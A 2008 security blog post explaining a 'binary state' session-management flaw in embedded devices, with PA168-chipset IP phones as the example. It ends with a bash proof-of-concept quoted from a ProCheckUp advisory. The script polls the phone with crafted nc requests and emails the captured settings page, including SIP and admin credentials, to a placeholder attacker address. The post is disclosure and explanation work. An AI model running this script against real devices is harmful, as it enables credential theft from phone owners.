---
title: Holes in Embedded Devices - Binary state session management
author: adrian-pastor
date: Tue, 29 Jan 2008 09:52:22 GMT
template: post.jade
---

This type of vulnerability is similar to IP address-based session management holes which has been discussed in my [previous post](/blog/holes-in-embedded-devices-ip-based-session-management). It is similar in the sense that the web browser of the admin user who is currently logged into the vulnerable device doesn't send any auth data such as session IDs or passwords. However, this vulnerability is more serious as illustrated by the algorithm implemented by the session management mechanism of the vulnerable device:

    if (submitted username and submitted password) == (credentials on device config)
    then
    	do activate admin session until session times out
    

    The implications are fatal: the device blindly trusts administrative HTTP requests, while the administrative session is regarded as active. In other words, if the attacker submitted an administrative request to the target device while an admin user was logged in (admin session would be active), the device would happily accept such request as it has no means to differentiate between the requests coming from the legitimate admin and those coming from the attacker!

    In this case, the attacker doesn't need to share the same source IP address with the legitimate admin user, but rather the bad guy can launch an automated attack like the one illustrated in my previous post IP address-based session management from any source IP address. The only requirement is that the submitted HTTP request is well-crafted so it looks exactly like a legitimate request.

    A real example includes IP phones from several brands that are based on the PA168 chipset. Several popular vendors in Asia such as ATCOM and SOYO ship firmwares such as version 1.42 and 1.54 that is susceptible to this vulnerability. Since the attacker can now send the malicious HTTP request from any IP address, these IP phones could be attacked remotely, provided that their web interface was Internet-facing.

    The following proof-of-concept script was published with ProCheckUp [PR06-14](http://www.procheckup.com/Vulner_PR0614.php) advisory. Such script repeatedly submits a request to the target IP phone which returns the full configuration settings as soon as an admin user logs into the web interface of the target phone. The returned configuration settings include sensitive data such as SIP gateway, SIP credentials and the credentials required to manage the IP phone:

    #!/bin/bash

    host="192.168.10.1";
    attackers_email="attacker@evil-domain.foo"
    req="POST /g HTTP/1.0\r\nContent-length: 13\r\n\r\nback=++Back++\r\n\r\n";

    while true
    do
        res=`echo -en $req | nc -nv $host 80`;
        if echo $res | grep superpassword # if this gets returned, then we got the settings page with all SIP account and IP phone creds
        then
            echo "GOT IT!"
            echo $res > "admin-settings-page"
            echo $res | mail $attackers_email -s "PA168 IP Phone admin's settings page"
            exit 1
        else
            echo "bad luck"
        fi
        sleep 5
    done
